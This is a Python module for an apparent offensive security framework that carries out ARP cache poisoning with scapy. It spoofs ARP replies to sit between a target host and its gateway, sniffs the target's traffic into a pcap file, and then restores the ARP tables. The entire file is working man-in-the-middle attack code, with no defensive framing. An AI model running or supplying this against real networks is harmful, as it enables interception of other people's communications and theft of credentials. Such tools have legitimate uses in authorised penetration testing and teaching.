from core.ISFFramework import ISFModule, Param
from util.commons import IPv4
from scapy.all import *
from scapy.layers.l2 import ARP
import os
import signal
import sys
import threading
import time


@ISFModule(name="ARPPoisoning",
           version="1.0",
           description="ARP cache poisoning",
           author="Not_so_sm4rt_hom3 team")
class ARPPoisoningModule:
    in_params = {
        "iface": Param("Target network interface", required=True),
        "gateway": Param("Gateway IP address", value_type=IPv4, required=True),
        "target": Param("Target IP address", value_type=IPv4, required=True),
        "packet_count": Param("Number of packets to capture", value_type=int,
                              required=False, default_value=1000),
        "out_file": Param("File where sniffed packets are written",
                          required=True)
    }

    @staticmethod
    def mac_lookup(ip):
        mac = '00:00:00:00:00:00'
        while mac == '00:00:00:00:00:00':
            resp, unans = sr(
                ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2,
                timeout=10)
            for r in resp:
                mac = r[1].hwsrc
                if mac != '00:00:00:00:00:00':
                    return mac
        return mac

    @staticmethod
    def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip,
                 hwsrc=target_mac,
                 psrc=target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip,
                 hwsrc=gateway_mac,
                 psrc=gateway_ip), count=5)
        print("[*] Disabling IP forwarding")
        os.system("sysctl -w net.inet.ip.forwarding=0")
        os.kill(os.getpid(), signal.SIGTERM)

    @staticmethod
    def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        try:
            while True:
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                         psrc=target_ip))
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=gateway_ip))
                time.sleep(2)
        except KeyboardInterrupt:
            print("[*] Stopped ARP poison attack. Restoring network")
            ARPPoisoningModule.restore_network(gateway_ip, gateway_mac,
                                               target_ip, target_mac)

    def run(self, params):
        gateway_ip = str(params["gateway"])
        target_ip = str(params["target"])
        packet_count = params["packet_count"]
        conf.iface = str(params["iface"])
        conf.verb = 0
        print("[*] Starting script: arp_poison.py")
        print("[*] Enabling IP forwarding")
        print("[*] Gateway IP address: {}".format(gateway_ip))
        print("[*] Target IP address: {}".format(target_ip))
        gateway_mac = ARPPoisoningModule.mac_lookup(gateway_ip)
        if gateway_mac is None:
            print(
                "[!] Unable to get gateway MAC address for {}. Exiting...".format(
                    gateway_ip))
            sys.exit(0)
        else:
            print("[*] Gateway MAC address: {}".format(gateway_mac))

        target_mac = ARPPoisoningModule.mac_lookup(target_ip)
        if target_mac is None:
            print("[!] Unable to get target MAC address. Exiting..")
            sys.exit(0)
        else:
            print("[*] Target MAC address: {}".format(target_mac))

        poison_thread = threading.Thread(target=ARPPoisoningModule.arp_poison,
                                         args=(
                                             gateway_ip, gateway_mac, target_ip,
                                             target_mac))
        poison_thread.start()

        try:
            sniff_filter = "ip host " + target_ip
            print(
                "[*] Starting network capture. Packet Count: {}. Filter: {}".format(
                    packet_count, sniff_filter))
            packets = sniff(filter=sniff_filter, iface=conf.iface,
                            count=packet_count)
            wrpcap(params["out_file"], packets)
            print("[*] Stopping network capture... Restoring network")
            ARPPoisoningModule.restore_network(gateway_ip, gateway_mac,
                                               target_ip, target_mac)
        except KeyboardInterrupt:
            print("[*] Stopping network capture... Restoring network")
            ARPPoisoningModule.restore_network(gateway_ip, gateway_mac,
                                               target_ip, target_mac)
            sys.exit(0)
